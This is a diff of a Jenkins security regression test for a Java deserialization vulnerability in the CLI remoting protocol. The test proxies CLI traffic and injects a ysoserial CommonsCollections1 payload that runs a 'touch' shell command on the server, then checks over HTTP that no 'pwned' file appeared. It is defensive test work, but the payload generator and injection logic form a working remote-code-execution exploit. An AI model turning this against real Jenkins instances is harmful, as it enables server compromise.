@@ -24,17 +24,16 @@
 
 package jenkins.security;
 
+import com.gargoylesoftware.htmlunit.FailingHttpStatusCodeException;
 import hudson.cli.CLI;
 import hudson.cli.CliPort;
 import hudson.remoting.BinarySafeStream;
 import hudson.util.DaemonThreadFactory;
-import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.DataOutputStream;
 import java.io.File;
 import java.io.IOException;
 import java.io.InputStream;
-import java.io.ObjectInputStream;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.InetSocketAddress;
@@ -45,41 +44,48 @@ import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 import java.util.concurrent.TimeUnit;
 import java.util.concurrent.TimeoutException;
-import java.util.concurrent.atomic.AtomicBoolean;
-import java.util.concurrent.atomic.AtomicInteger;
-import org.apache.commons.io.FileUtils;
-import org.apache.commons.io.IOUtils;
-import org.junit.Test;
+import jenkins.security.security218.ysoserial.payloads.CommonsCollections1;
+import jenkins.security.security218.ysoserial.util.Serializables;
 import static org.junit.Assert.*;
+import org.junit.Test;
 import org.junit.Rule;
 import org.jvnet.hudson.test.JenkinsRule;
 import org.jvnet.hudson.test.recipes.PresetData;
 
 public class Security218BlackBoxTest {
 
+    private static final String overrideURL = System.getenv("JENKINS_URL");
+    private static final String overrideHome = System.getenv("JENKINS_HOME");
+    static {
+        assertTrue("$JENKINS_URL and $JENKINS_HOME must both be defined together", (overrideURL == null) == (overrideHome == null));
+    }
+
     private static final ExecutorService executors = Executors.newCachedThreadPool(new DaemonThreadFactory());
 
     @Rule
     public JenkinsRule r = new JenkinsRule();
 
-    @PresetData(PresetData.DataSet.NO_ANONYMOUS_READACCESS)
+    @SuppressWarnings("deprecation") // really mean to use getPage(String)
+    @PresetData(PresetData.DataSet.ANONYMOUS_READONLY) // TODO userContent inaccessible without authentication otherwise
     @Test
     public void probe() throws Exception {
-        File pwned = new File("/tmp/pwned"); // TODO fix payload() to set a system property and test that instead
-        final AtomicInteger round = new AtomicInteger();
-        final AtomicBoolean foundRound = new AtomicBoolean();
-        do {
-            foundRound.set(false);
-            System.err.println("Round #" + round);
-            FileUtils.deleteQuietly(pwned);
+        JenkinsRule.WebClient wc = r.createWebClient();
+        final URL url = overrideURL == null ? r.getURL() : new URL(overrideURL);
+        wc.getPage(url + "userContent/readme.txt");
+        try {
+            wc.getPage(url + "userContent/pwned");
+            fail("already compromised?");
+        } catch (FailingHttpStatusCodeException x) {
+            assertEquals(404, x.getStatusCode());
+        }
+        for (int round = 0; round < 2; round++) {
+            final int _round = round;
             final ServerSocket proxySocket = new ServerSocket(0);
             executors.submit(new Runnable() {
                 @Override
                 public void run() {
                     try {
                         Socket proxy = proxySocket.accept();
-                        String overrideURL = System.getenv("JENKINS_URL");
-                        URL url = overrideURL == null ? r.getURL() : new URL(overrideURL);
                         Socket real = new Socket(url.getHost(), ((HttpURLConnection) url.openConnection()).getHeaderFieldInt("X-Jenkins-CLI-Port", -1));
                         final InputStream realIS = real.getInputStream();
                         final OutputStream realOS = real.getOutputStream();
@@ -166,8 +172,7 @@ public class Security218BlackBoxTest {
                                             nullCount = 0;
                                         }
                                     }
-                                    if (round.get() == 0) {
-                                        foundRound.set(true);
+                                    if (_round == 0) {
                                         System.err.println("injecting payload into capability negotiation");
                                         // replacing \x00\x14Protocol:CLI-connect<===[JENKINS REMOTING CAPACITY]===>rO0ABXNyABpodWRzb24ucmVtb3RpbmcuQ2FwYWJpbGl0eQAAAAAAAAABAgABSgAEbWFza3hwAAAAAAAAAP4=\x00\x00\x00\x00
                                         new DataOutputStream(realOS).writeUTF("Protocol:CLI-connect"); // TCP agent protocol
@@ -207,8 +212,7 @@ public class Security218BlackBoxTest {
                                             if (hasMore) {
                                                 continue;
                                             }
-                                            if (++packet == round.get()) {
-                                                foundRound.set(true);
+                                            if (++packet == _round) {
                                                 System.err.println("injecting payload into packet");
                                                 byte[] data = payload();
                                                 realOS.write(data.length / 256);
@@ -225,7 +229,7 @@ public class Security218BlackBoxTest {
                                             break;
                                         }
                                     }
-                                } catch (IOException x) {
+                                } catch (Exception x) {
                                     x.printStackTrace();
                                 }
                             }
@@ -252,13 +256,17 @@ public class Security218BlackBoxTest {
                             x.printStackTrace();
                         }
                     }
-                }).get(15, TimeUnit.SECONDS);
+                }).get(5, TimeUnit.SECONDS);
             } catch (TimeoutException x) {
                 System.err.println("CLI command timed out");
             }
-            assertFalse("Pwned!", pwned.isFile());
-            round.incrementAndGet();
-        } while (foundRound.get());
+            try {
+                wc.getPage(url + "userContent/pwned");
+                fail("Pwned!");
+            } catch (FailingHttpStatusCodeException x) {
+                assertEquals(404, x.getStatusCode());
+            }
+        }
     }
 
     private static synchronized void display(byte[] data) {
@@ -273,8 +281,7 @@ public class Security218BlackBoxTest {
 
     private static synchronized void showSer(byte[] data) {
         try {
-            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
-            Object o = ois.readObject();
+            Object o = Serializables.deserialize(data);
             System.err.print(o);
         } catch (Exception x) {
             System.err.printf("<%s>", x);
@@ -282,14 +289,10 @@ public class Security218BlackBoxTest {
     }
 
     /** An attack payload, as a Java serialized object ({@code \xAC\ED…}). */
-    private static byte[] payload() throws IOException {
-        // TODO from ysoserial; use that library to generate other payloads on demand (would like a variant which uses System.setProperty for more portable tests)
-        InputStream is = Security218BlackBoxTest.class.getResourceAsStream("payload.ser");
-        try {
-            return IOUtils.toByteArray(is);
-        } finally {
-            is.close();
-        }
+    private byte[] payload() throws Exception {
+        File home = overrideHome == null ? r.jenkins.root : new File(overrideHome);
+        // TODO find a Windows equivalent
+        return Serializables.serialize(new CommonsCollections1().getObject("touch " + new File(new File(home, "userContent"), "pwned")));
     }
 
 }
